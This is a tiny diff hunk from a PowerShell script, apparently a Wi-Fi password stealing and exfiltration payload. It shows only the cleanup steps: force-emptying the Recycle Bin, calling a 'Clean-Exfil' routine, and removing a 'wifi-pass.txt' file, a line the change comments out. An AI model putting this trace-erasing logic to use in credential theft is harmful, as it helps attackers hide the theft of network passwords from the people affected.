@@ -60,4 +60,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI wifi-pass.txt
+# RI wifi-pass.txt
